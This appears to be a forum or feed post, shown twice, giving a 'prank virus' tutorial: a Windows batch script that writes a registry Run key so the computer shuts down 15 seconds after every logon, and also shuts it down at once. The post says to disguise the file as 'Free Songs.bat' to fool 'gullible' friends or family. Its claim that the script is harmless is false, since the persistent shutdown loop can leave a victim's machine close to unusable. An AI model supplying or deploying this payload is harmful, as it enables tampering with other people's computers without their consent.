channel.title: Fake Virus/Shutdown
channel.description:
Making a fun and harmless Virus for trick your friends / family in 3 easy steps :D
[b]Step 1:[/b] Open Up A New Text Document(Preferable Notepad) and add in the following [code] @ECHO off CLS ECHO REGEDIT4 >> temp.reg ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "ownage"="shutdown.exe -s -t 15" >> temp.reg REGEDIT.EXE /s temp.reg SHUTDOWN.EXE -s -t 15[/code]
[b]Step 2:[/b] Go To Save As>Free Songs.bat>All Files (Make Sure You Change It From "Text Document(*.txt)" For It To Work)
[b]Step 3:[/b] Wait For Some Gullable Person To Actaully Think They Have Fucked Up The Computer ;)
Enjoy,
Dark Star

@xxlegitxx wrote:

item.title: Fake Virus/Shutdown
item.dc:creator: @Dark_Star1 Dark_Star
item.description:
@Dark_Star1 wrote:

Making a fun and harmless Virus for trick your friends / family in 3 easy steps

Step 1: Open Up A New Text Document(Preferable Notepad) and add in the following

@ECHO off CLS ECHO REGEDIT4 >> temp.reg ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> temp.reg ECHO "ownage"="shutdown.exe -s -t 15" >> temp.reg REGEDIT.EXE /s temp.reg SHUTDOWN.EXE -s -t 15

Step 2: Go To Save As>Free Songs.bat>All Files (Make Sure You Change It From “Text Document(*.txt)” For It To Work)

Step 3: Wait For Some Gullable Person To Actaully Think They Have Fucked Up The Computer

Enjoy,

Dark Star

Read full topic
